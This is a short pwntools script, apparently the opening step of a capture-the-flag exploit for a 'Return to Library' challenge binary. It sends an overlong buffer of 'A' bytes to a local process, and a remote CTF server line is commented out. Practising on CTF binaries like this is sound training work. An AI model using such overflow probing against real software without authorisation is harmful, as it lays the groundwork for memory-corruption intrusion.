from pwn import *

# port = 17440
# rem = remote("srv1.kitriwhs.kr", port)
rem = process('./Return to Library/rtl')

rem.sendafter(b'Buf: ', b'A' * 0x31)
print(rem.recvline())